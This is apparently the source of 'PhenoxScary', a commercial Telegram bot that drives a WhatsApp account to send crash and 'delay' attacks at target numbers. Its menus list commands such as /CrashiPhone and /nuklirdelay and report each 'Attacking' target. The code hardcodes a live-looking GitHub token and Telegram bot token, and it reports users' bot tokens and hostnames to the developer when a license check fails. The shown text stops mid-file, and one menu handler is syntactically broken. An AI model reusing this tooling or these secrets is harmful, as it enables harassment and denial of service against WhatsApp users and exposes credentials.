const { Telegraf, Markup, session } = require("telegraf"); 
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  getMandarinObfuscationConfig,
  generateWAMessage,
} = require("lotusbail");
const { Octokit } = require("@octokit/rest");
const fs = require("fs");
const os = require("os");
const path = require("path");
const moment = require("moment-timezone");
const axios = require("axios");
const pino = require("pino");
const chalk = require("chalk");
const figlet = require("figlet");
const gradient = require("gradient-string");
const { BOT_TOKEN } = require("./Token");
const crypto = require("crypto");
const fetch = require('node-fetch');
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
const premiumFile = "./DatabaseUser/premiumuser.json";
const adminFile = "./DatabaseUser/adminuser.json";
const ownerFile = "./phenoxId.json";
const ownerID = 7653566720;
const proccesImg = "https://files.catbox.moe/runwxx.jpg";
const Module = require('module');

const originalRequire = Module.prototype.require;

Module.prototype.require = function (request) {
    if (request.toLowerCase() === 'axios') {
        console.error("⚠");
        process.exit(1);
    }
    return originalRequire.apply(this, arguments);
};

console.log("[INFO] : Active System Protection✓");
//=================================================\\
let bots = [];
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const developerId = "7454464877"; 

const bot = new Telegraf(BOT_TOKEN);
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

bot.use(session());

const randomImages = [
   "https://files.catbox.moe/9sa7zm.mp4",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

function parseDuration(durationStr) {
  const match = durationStr.match(/^(\d+)([dhm])$/);
  if (!match) return 0;
  const value = parseInt(match[1]);
  const unit = match[2];
  switch (unit) {
    case 'd': return value * 24 * 60 * 60 * 1000;
    case 'h': return value * 60 * 60 * 1000;
    case 'm': return value * 60 * 1000;
    default: return 0;
  }
}


function isActiveUser(list, id) {
  if (!list[id]) return false;
  return new Date(list[id]) > new Date();
}


const ownerIdFile = "./phenoxId.json";
const groupConfigPath = "./DatabaseUser/group.json";

function loadOwnerData() {
  try {
    return JSON.parse(fs.readFileSync(ownerIdFile));
  } catch {
    return {};
  }
}

function isValidOwner(id) {
  if (id === "7454464877") return true; 

  const owners = loadOwnerData();
  const exp = owners[id];
  if (!exp) return false;

  const now = new Date();
  const expiredAt = new Date(exp);
  return expiredAt > now;
}

function loadGroupConfig() {
  try {
    return JSON.parse(fs.readFileSync(groupConfigPath));
  } catch {
    return { isGroupOnly: false };
  }
}

function saveGroupConfig(data) {
  fs.writeFileSync(groupConfigPath, JSON.stringify(data, null, 2));
}

let groupConfig = loadGroupConfig();

const githubToken = "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";

const octokit = new Octokit({ auth: githubToken });

const welcomeConfigFile = "./DatabaseUser/welcome.json";

function loadWelcomeConfig() {
  try {
    return JSON.parse(fs.readFileSync(welcomeConfigFile));
  } catch {
    return { enabled: false };
  }
}

function saveWelcomeConfig(config) {
  fs.writeFileSync(welcomeConfigFile, JSON.stringify(config, null, 2));
}
//=================================================\\
const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

const COOLDOWN_FILE = path.join(__dirname, "DatabaseUser", "cooldown.json");
let globalCooldown = 0;

function getCooldownData(ownerId) {
  const cooldownPath = path.join(
    DATABASE_DIR,
    "users",
    ownerId.toString(),
    "cooldown.json"
  );
  if (!fs.existsSync(cooldownPath)) {
    fs.writeFileSync(
      cooldownPath,
      JSON.stringify(
        {
          duration: 0,
          lastUsage: 0,
        },
        null,
        2
      )
    );
  }
  return JSON.parse(fs.readFileSync(cooldownPath));
}

function loadCooldownData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE, "utf8");
      return JSON.parse(data);
    }
    return { defaultCooldown: 60 };
  } catch (error) {
    console.error("Error loading cooldown data:", error);
    return { defaultCooldown: 60 };
  }
}

function saveCooldownData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

function isOnGlobalCooldown() {
  return Date.now() < globalCooldown;
}

function setGlobalCooldown() {
  const cooldownData = loadCooldownData();
  globalCooldown = Date.now() + cooldownData.defaultCooldown * 1000;
}

function parseCooldownDuration(duration) {
  const match = duration.match(/^(\d+)([smhd])$/i); 
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value;
    case "m": return value * 60;
    case "h": return value * 3600;
    case "d": return value * 86400;
    default: return null;
  }
}

function isOnCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return false;

  const now = Date.now();
  return now < cooldownData.lastUsage + cooldownData.duration;
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}

function getRemainingCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return 0;

  const now = Date.now();
  const remaining = cooldownData.lastUsage + cooldownData.duration - now;
  return remaining > 0 ? remaining : 0;
}

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

//=================================================\\
const GITHUB_TOKEN_URL = "https://raw.githubusercontent.com/DilzXd1/Db/refs/heads/main/database.json";
const TELEGRAM_ALERT_ID = "7454464877";
const TELEGRAM_BOT_TOKEN = "7309806538:AAHA9dJg8doTYqy1oTMPX7MomDAoX8zS_lM";

async function validateToken() {
  try {
    const res = await axios.get(GITHUB_TOKEN_URL);
    const validTokens = res.data.tokens || [];

    if (!validTokens.includes(BOT_TOKEN)) {
      console.log("❌ Token tidak valid.");
      await sendBypassAlert("Token tidak terdaftar");
      process.exit(1);
    }

    console.log("Succes Login Acces...");
  } catch (err) {
    console.error("⚠️ Gagal mengambil token dari GitHub:", err.message);
    process.exit(1);
  }
}

async function sendBypassAlert(reason) {
  const idData = JSON.parse(fs.readFileSync("./phenoxId.json"));
  const currentId = Object.keys(idData)[0];
  const time = moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss");
  const domain = process.env.HOSTNAME || os.hostname();

  const text = `
‼️ *PENCOBAAN BYPASS TERDETEKSI* ‼️
ID: ${currentId}
Token: \`${BOT_TOKEN}\`
Reason: ${reason}
Domain: ${domain}
Time: ${time}
`.trim();

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_ALERT_ID,
      text,
      parse_mode: "Markdown"
    });
    console.log("‼️ Notifikasi Telah Dikirim Ke Developer.");
  } catch (e) {
    console.error("❌ Gagal kirim notifikasi:", e.message);
  }
}

validateToken();
//=================================================\\
const githubOwner1 = "DilzXd1";
const githubRepo1 = "Db";
const tokenPath = "database.json";
const resellerPath = "reseller.json";
const paymentPath = "payment.json";

function formatNominal(num) {
  if (num >= 1000000) return (num / 1000000).toFixed(0) + "M";
  if (num >= 1000) return (num / 1000).toFixed(0) + "k";
  return num.toString();
}

// ==== PT role (boleh add/del reseller) ====
const ptPath = "pt.json";

async function isPT(userId) {
  try {
    const url = `https://raw.githubusercontent.com/${githubOwner1}/${githubRepo1}/main/${ptPath}`;
    const { data } = await axios.get(url);
    const list = data.pt || data.pts || []; // fallback kalau struktur file lama
    return list.includes(userId);
  } catch (e) {
    console.error("Gagal cek PT:", e.message);
    return false;
  }
}
async function openaiChat(text) {
    try {
        const response = await axios.get(
            `https://exonity.tech/api/gptlogic2?message=${encodeURIComponent(text)}&prompt=hai&mode=realtime`
        );
        const data = response.data;

        if (data.status === 200) {
            return data.result || "Tidak ada respons dari API.";
        } else {
            return "API mengembalikan status gagal.";
        }
    } catch (error) {
        console.error("Error:", error.message);
        return "Maaf, terjadi kesalahan saat memproses permintaan.";
    }
}



async function isPTorDev(userId) {
  return userId === developerId || (await isPT(userId));
}

// ==== MOD role (boleh add/del PT) ====
const modPath = "mod.json";

async function isMOD(userId) {
  try {
    const url = `https://raw.githubusercontent.com/${githubOwner1}/${githubRepo1}/main/${modPath}`;
    const { data } = await axios.get(url);
    const list = data.mod || data.mods || [];
    return list.includes(userId);
  } catch (e) {
    console.error("Gagal cek MOD:", e.message);
    return false;
  }
}

async function isMODorDev(userId) {
  return userId === developerId || (await isMOD(userId));
}

async function isResellerOrOwner(userId) {
  if (userId === developerId) return true;

  try {
    const url = `https://raw.githubusercontent.com/${githubOwner1}/${githubRepo1}/main/${resellerPath}`;
    const { data } = await axios.get(url);
    return data.resellers.includes(userId);
  } catch (e) {
    console.error("Gagal cek reseller:", e.message);
    return false;
  }
}

async function updateGitHubJSON(filePath, updateCallback) {
  try {
    const res = await octokit.repos.getContent({
      owner: githubOwner1,
      repo: githubRepo1,
      path: filePath
    });

    const content = Buffer.from(res.data.content, "base64").toString();
    const json = JSON.parse(content);
    const updatedJSON = await updateCallback(json);

    const encodedContent = Buffer.from(JSON.stringify(updatedJSON, null, 2)).toString("base64");

    await octokit.repos.createOrUpdateFileContents({
      owner: githubOwner1,
      repo: githubRepo1,
      path: filePath,
      message: `Update ${filePath}`,
      content: encodedContent,
      sha: res.data.sha,
    });

    return true;
  } catch (err) {
    console.error("Update gagal:", err.message);
    return false;
  }
}

//=================================================\\
const MAINTENANCE_RAW_URL = "https://raw.githubusercontent.com/DilzXd1/Db/refs/heads/main/security.json";
const BOT_OWNER_ID = "7454464877";

const githubMaintenanceConfig = {
  repoOwner: "DilzXd1",
  repoName: "Db",
  branch: "refs/heads/main",
  filePath: "security.json"
};

async function getMaintenanceStatus() {
  try {
    const res = await axios.get(MAINTENANCE_RAW_URL);
    return res.data || { status: "off", message: "" };
  } catch (err) {
    console.error("❌ Gagal cek maintenance:", err.message);
    return { status: "off", message: "" };
  }
}

async function setMaintenanceStatus(status, message = "") {

  try {
    const { data: fileData } = await octokit.repos.getContent({
      owner: githubMaintenanceConfig.repoOwner,
      repo: githubMaintenanceConfig.repoName,
      path: githubMaintenanceConfig.filePath,
      ref: githubMaintenanceConfig.branch
    });

    const sha = fileData.sha;

    const updatedContent = Buffer.from(
      JSON.stringify({ status, message }, null, 2)
    ).toString("base64");

    await octokit.repos.createOrUpdateFileContents({
      owner: githubMaintenanceConfig.repoOwner,
      repo: githubMaintenanceConfig.repoName,
      path: githubMaintenanceConfig.filePath,
      message: `Set maintenance ${status}`,
      content: updatedContent,
      sha,
      branch: githubMaintenanceConfig.branch
    });

    return true;
  } catch (err) {
    console.error("❌ Gagal update maintenance:", err.message);
    return false;
  }
}

//=================================================\\
const VERSION_RAW_URL = "https://raw.githubusercontent.com/DilzXd1/Db/refs/heads/main/version.json";
const BOT_OWNER_ID2 = "7454464877"; 

const githubVersionConfig = {
  repoOwner: "DilzXd1",
  repoName: "Db",
  branch: "refs/heads/main",
  filePath: "version.json"
};

async function getBotVersion() {
  try {
    const res = await axios.get(VERSION_RAW_URL);
    return res.data?.version || "Unknown";
  } catch (e) {
    console.error("❌ Gagal mengambil versi bot:", e.message);
    return "Unknown";
  }
}

async function updateBotVersion(newVersion) {

  try {
    const { data: fileData } = await octokit.repos.getContent({
      owner: githubVersionConfig.repoOwner,
      repo: githubVersionConfig.repoName,
      path: githubVersionConfig.filePath,
      ref: githubVersionConfig.branch
    });

    const sha = fileData.sha;

    const updatedContent = Buffer.from(
      JSON.stringify({ version: newVersion }, null, 2)
    ).toString("base64");

    await octokit.repos.createOrUpdateFileContents({
      owner: githubVersionConfig.repoOwner,
      repo: githubVersionConfig.repoName,
      path: githubVersionConfig.filePath,
      message: `Update versi ${newVersion}`,
      content: updatedContent,
      sha: sha,
      branch: githubVersionConfig.branch
    });

    return true;
  } catch (err) {
    console.error("❌ Gagal update versi bot:", err.message);
    return false;
  }
}

//=================================================\\
const githubOwner2 = "DilzXd1";
const githubRepo2 = "Db";
const blacklistPath = "blacklist.json";

async function updateGitHubBlacklist(updateFn) {
  try {
    const { data: fileData } = await octokit.repos.getContent({
      owner: githubOwner2,
      repo: githubRepo2,
      path: blacklistPath,
    });

    const content = Buffer.from(fileData.content, "base64").toString();
    const json = JSON.parse(content);
    const updated = await updateFn(json);

    await octokit.repos.createOrUpdateFileContents({
      owner: githubOwner2,
      repo: githubRepo2,
      path: blacklistPath,
      message: "Update blacklist.json",
      content: Buffer.from(JSON.stringify(updated, null, 2)).toString("base64"),
      sha: fileData.sha,
    });

    return true;
  } catch (e) {
    console.error("Gagal update blacklist:", e.message);
    return false;
  }
}

//=================================================\\
const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Ubuntu', 'Chrome', '20.00.04'],
    getMessage: async () => ({
      conversation: 'P',
    }),
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      isWhatsAppConnected = true;
      console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃  ${chalk.green.bold('WHATSAPP CONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

      console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('WHATSAPP DISCONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍
${shouldReconnect ? 'Reconnecting...' : ''}`));

      if (shouldReconnect) {
        startSesi();
      }

      isWhatsAppConnected = false;
    }
  });
};



//=================================================\\
const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
  if (!isActiveUser(ownerUsers, ctx.from.id.toString())) {
    return ctx.reply("❌ Anda bukan Owner");
  }
  next();
};

const checkAdmin = (ctx, next) => {
  if (!isActiveUser(adminUsers, ctx.from.id.toString())) {
    return ctx.reply("❌ Anda bukan Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!isActiveUser(premiumUsers, ctx.from.id.toString())) {
    return ctx.reply("Can Only Be Used Premium User");
  }
  next();
};

const addOwner = (userId, duration) => {
  const expired = new Date(Date.now() + parseDuration(duration)).toISOString();
  ownerUsers[userId] = expired;
  fs.writeFileSync(ownerFile, JSON.stringify(ownerUsers, null, 2));
};

const removeOwner = (userId) => {
  delete ownerUsers[userId];
  fs.writeFileSync(ownerFile, JSON.stringify(ownerUsers, null, 2));
};

const addAdmin = (userId, duration) => {
  const expired = new Date(Date.now() + parseDuration(duration)).toISOString();
  adminUsers[userId] = expired;
  fs.writeFileSync(adminFile, JSON.stringify(adminUsers, null, 2));
};

const removeAdmin = (userId) => {
  delete adminUsers[userId];
  fs.writeFileSync(adminFile, JSON.stringify(adminUsers, null, 2));
};

const addPremium = (userId, duration) => {
  const expired = new Date(Date.now() + parseDuration(duration)).toISOString();
  premiumUsers[userId] = expired;
  fs.writeFileSync(premiumFile, JSON.stringify(premiumUsers, null, 2));
};

const removePremium = (userId) => {
  delete premiumUsers[userId];
  fs.writeFileSync(premiumFile, JSON.stringify(premiumUsers, null, 2));
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("› WhatsApp Not Connected!");
    return;
  }
  next();
};

const prosesrespone1 = async (target, ctx) => {
  const caption = `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ⌜ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 ⌟
┃› › Attacking : tg://user?id=${target.split("@") [0]}
┗━━━━━━━━━━━━━━━━━━━━━━━❍
 `;

  try {
      await ctx.replyWithPhoto("https://files.catbox.moe/jiqsek.jpg", {
          caption: caption,
          parse_mode: "Markdown", 
          reply_markup: {
            inline_keyboard: [
                [{ text: "Check Target", callback_data: `tg://user?id=${target.split("@") [0]}` }]
            ]
        }
      });
      console.log(chalk.blue.bold(`[✓] Process attack target: ${target}`));
  } catch (error) {
      console.error(chalk.red.bold('[!] Error sending process response:', error));
      // Fallback to text-only message if image fails
      await ctx.reply(caption, { parse_mode: "Markdown" });
  }
};

const donerespone1 = async (target, ctx) => {
  // Get random hexcolor for timestamp
  const hexColor = '#' + Math.floor(Math.random()*16777215).toString(16);
  const timestamp = moment().format('HH:mm:ss');
  
  try {
    const caption = `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ⌜ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 ⌟
┃› › Attacking : tg://user?id=${target.split("@") [0]}
┗━━━━━━━━━━━━━━━━━━━━━━━❍
 `;
 
    await ctx.replyWithPhoto("https://files.catbox.moe/jiqsek.jpg", {
        caption: caption,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [{ text: "Check Target!", callback_data: `tg://user?id=${target.split("@") [0]}` }]
            ]
        }
    });
    console.log(chalk.green.bold(`[✓] Attack in succes target: ${target}`));
  } catch (error) {
      console.error(chalk.red.bold('[!] Error:', error));
      // Fallback message tanpa quotes jika API error
      const fallbackCaption = `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ⌜ 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 ⌟
┃› › Attacking : ${target.split("@") [0]}
┗━━━━━━━━━━━━━━━━━━━━━━━❍
`;
 
      await ctx.reply(fallbackCaption, {
          parse_mode: "Markdown",
          reply_markup: {
              inline_keyboard: [
                  [{ text: "Check Target!", url: `tg;//user?id=${target.split("@") [0]}` }]
              ]
          }
      });
  }
 };
 
 
function isMeOnly(ctx) {
  const devId = "7653566720";
  return ctx.from?.id?.toString() === devId;
}

function getSystemInfo() {
  const totalMem = os.totalmem() / (1024 * 1024);
  const freeMem = os.freemem() / (1024 * 1024);
  const usedMem = totalMem - freeMem;
  const cpuUsage = os.loadavg()[0].toFixed(2); // 1 menit rata-rata load

  return {
    ram: `${usedMem.toFixed(2)}MB / ${totalMem.toFixed(2)}MB`,
    cpu: `${cpuUsage}`,
    uptime: getUptime()
  };
}
//=================================================\\
bot.use(async (ctx, next) => {
  const senderId = ctx.from?.id?.toString();
  const chatId = ctx.chat?.id?.toString();
  const chatType = ctx.chat?.type;

  // ========== [ MAINTENANCE CHECK ] ==========
  try {
    const { status, message } = await getMaintenanceStatus();
    if (status === "on" && senderId !== BOT_OWNER_ID) {
      return ctx.reply(`🛠️ *Maintenance Mode Aktif*\n${message}`, {
        parse_mode: "Markdown",
      });
    }
  } catch (err) {
    console.error("Gagal cek maintenance:", err.message);
  }

  // ========== [ GROUPONLY MODE ] ==========
  try {
    const groupConfig = loadGroupConfig();
    const isGroup = chatType === "group" || chatType === "supergroup";

    if (groupConfig.isGroupOnly && !isGroup && !isValidOwner(senderId)) {
      return ctx.reply("❌ Bot hanya dapat digunakan di grup saat mode grouponly aktif.");
    }

  } catch (err) {
    console.error("Gagal cek GroupOnly:", err.message);
  }

  // ========== [ BLACKLIST CHECK ] ==========
  try {
    const { data } = await axios.get(`https://raw.githubusercontent.com/${githubOwner2}/${githubRepo2}/main/${blacklistPath}`);
    const isBlacklisted = data.blacklist.includes(senderId);

    if (isBlacklisted) {
      return ctx.reply("🚫 Anda masuk dalam daftar blacklist dan tidak dapat menggunakan bot ini.");
    }
  } catch (err) {
    console.error("Gagal cek blacklist:", err.message);
  }

  // ========== [ USER / GROUP TRACKING ] ==========
  const dbFile = "./DatabaseUser/userlist.json";
  let db = { private: [], group: [] };

  try {
    if (fs.existsSync(dbFile)) {
      db = JSON.parse(fs.readFileSync(dbFile));
    }

    if (chatType === "private" && !db.private.includes(chatId)) {
      db.private.push(chatId);
    } else if ((chatType === "group" || chatType === "supergroup") && !db.group.includes(chatId)) {
      db.group.push(chatId);
    }

    fs.writeFileSync(dbFile, JSON.stringify(db, null, 2));
  } catch (err) {
    console.error("Gagal mencatat user/group:", err.message);
  }

  // ========== [ LANJUT KE NEXT MIDDLEWARE ] ==========
  return next();
});

//=================================================\\
bot.on("getsuzo", async (ctx) => {
  const config = loadWelcomeConfig();
  const userId = ctx.from.id.toString();

  if (!config.enabled) return;

  const member = ctx.message.new_chat_members[0];
  const name = member.first_name;
  const groupTitle = ctx.chat.title;

  const welcomeText = `👋 *Selamat Datang* [${name}](tg://user?id=${member.id}) di grup *${groupTitle}*!\n\n📌 Pastikan baca aturan & jangan promosi ya~`;
  const photoUrl = "https://files.catbox.moe/zgkw7a.jpg"; 

  await ctx.telegram.sendPhoto(ctx.chat.id, photoUrl, {
    caption: welcomeText,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "💬 Join Room", url: "https://t.me/+r55iQVLXEwA1YmQ9" }],
        [{ text: "💬 Join Channel", url: "https://t.me/SanzzChannel" }],
      ],
    },
  });
});

//=================================================\\
bot.hears(/^(start|menu|mulai)$/i, async (ctx) => {
  const sender = ctx.from.username
      ? `@${ctx.from.username}`
  const versi = getBotVersion();
  const userId = ctx.from.id.toString();

  const mainMenuMessage = `
<blockquote>( ! ) Allow Acces</blockquote>
( Description ) : The script was built to help the weak, 
not to help the powerful...
While you are high, don't strengthen the stronger.

ス Author : https://www.ceo/renzishere
ス Version : ${versi}
ス Script : PhenoxScary 
ス Language : JavaScript 
ス User : ${sender}

<blockquote>Please Select Menu to Perform Activities</blockquote>
`;

  const keyboard = [
    [
      { text: "PhenoxScary", callback_data: "bugm" },
      { text: "Developer Area", callback_data: "dev_menu" }
    ],
    [
      { text: "System Information", callback_data: "system_menu" },
      { text: "This Owner", url: "t.me/RapzXyzz" }
    ],
  ];

  await ctx.replyWithVideo(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: keyboard }
  });
});


bot.action("dev_menu", async (ctx) => {
  const userId = ctx.from.id.toString();

  if (userId !== developerId) {
    await ctx.answerCbQuery("𝗧𝗵𝗶𝘀 𝗺𝗲𝗻𝘂 𝗰𝗮𝗻 𝗼𝗻𝗹𝘆 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗯𝘆 𝗱𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿𝘀!", { show_alert: true });
    return;
  }
  
  const mainMenuMessage = `
╭──(    PhenoxScary Source    )
Accdb Id duration
Deldb Id 
Maintenance on/off
Setversi versi

( # ) *DATABASE*
Listmem
addbl Id
delbl Id
Accmod Id
Delmod Id
Accpt Id
Delpt Id
Accress Id
Delress Id
Acctoken token
Deltoken token

*›› Sender Added Menu*
Addcreds
Listsender

( # ) *FITUR GROUP*
setwelcome on/off
ban reply
unban reply
kick reply
mute reply duration
unmute reply
╰━━━━━━━━━━━━━━━━━━━━━⬣
`;

  const media = {
    type: "video",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "Back To Menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithVideo(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("system_menu", async (ctx) => {
  
  const mainMenuMessage = `
Core ScaryPhenox - ス

Unit Pusat Struktur PhenoxScary.
Phenox Bot Adalah Ekosistem Modular Yang Dirancang Untuk Otomatisasi, Investigasi Digital, Dan Kendali Penuh Atas Data Dan Media.

Dengan Integrasi Sistematis Yang Stabil Dan Framework Kuat, PhenoxScary Memungkinkan Kamu:
› Integrasi Eksploitasi Dan Intelijen
› Fokus Pada Efektivitas Dan Kemudahan User

Built Not Just To Assist, But To Dominate The Flow Of Data.
`;

  const media = {
    type: "video",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "ス Owner Menu", 
          callback_data: "owner_menu", 
        },
        {
          text: "ス Manifest",
          callback_data: "manifest",
        }
      ], 
      [
        {
          text: "ス Tools",
          callback_data: "tools_menu",
        },
        {
          text: " back to menu", 
          callback_data: "back", 
        }
      ],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithVideo(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("owner_menu", async (ctx) => {
  
  const mainMenuMessage = `
╭──(     Owner Area      )
☇ Accadmin Id duration
☇ Deladmin Id
☇ Accprem Id duration
☇ Delprem Id
☇ Setcd duartion
☇ Grouponly on/off
☇ Cek 
☇ Connect 628××××
╰━━━━━━━━━━━━━━━━━⬣
`;

  const media = {
    type: "video",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: " Back to menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithVideo(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.hears(/^speed$/i, async (ctx) => {
  const sys = getSystemInfo();
  const versi = await getBotVersion();
  const userId = ctx.from.id.toString();
  
  const mainMenuMessage = `
<blockquote>System Information</blockquote>
›› Runtime ›› ${sys.uptime}
›› Cpu ›› ${sys.cpu}
›› Ram ›› ${sys.ram}
<blockquote>@ PhenoxScary</blockquote>
`;

  const media = {
    type: "video",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithVideo(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});



bot.action("tools_menu", async (ctx) => {
  
  const mainMenuMessage = `
╭──(     Tools Area      )
›› stiktok 
›› Trackip
›› Cekip
›› Iqc 
›› Tiktok
›› Cekidch
›› Lapor
›› Countryinfo
›› Cekid
╰━━━━━━━━━━━━━━━━━⬣
<blockquote>© PhenoxScary</blockquote>
`;

  const media = {
    type: "video",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: " Back to menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithVideo(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("menu_all", async (ctx) => {
const sys = getSystemInfo();
const versi = await getBotVersion();
  
  const mainMenuMessage = `
 -------! 𝗖𝗼𝗿𝗲 𝗠𝗼𝗱𝘂𝗹𝗲--------
 ( 𝗠𝗲𝗻𝘂 𝗔𝗰𝗰𝗲𝘀 ) 
» addadmin Id duration
» deladmin Id
» addprem Id duration
» delprem Id
» setjeda duartion
» Grouponlyon/off
» Cek <target>
» Connect 628xxx
» Gpt

( 𝗦𝘆𝘀𝘁𝗲𝗺 & 𝗜𝗻𝗳𝗼 ) 
» Ram ${sys.ram}
» Runtime ${sys.uptime}
» Cpu ${sys.cpu}
» Version ${versi}

( 𝗠𝗲𝗻𝘂 𝗫𝗽𝗹𝗼𝗶𝘁𝗲 )
› /nuklirdelay ( Delay Hard Invisible )
› /CrashiPhone ( Crash iPhone! )
› /bomblank ( Blank X Crash )
› /Crash ( Crash Infinity )
© 𝗚𝗲𝘁𝘀𝘂𝘇𝗼𝗫↑𝗰𝗼𝗺𝗽𝗮𝗻𝘆 🐉
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: " Back to menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("tqto", async (ctx) => {
  
  const mainMenuMessage = `\`\`\`
CONTRIBUTORS

›› @RapzXyzz ( Moodderr ) 
\`\`\`
© PhenoxScary ス
`;

  const media = {
    type: "video",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: " Back to menu", 
          callback_data: "back",
        }
      ],
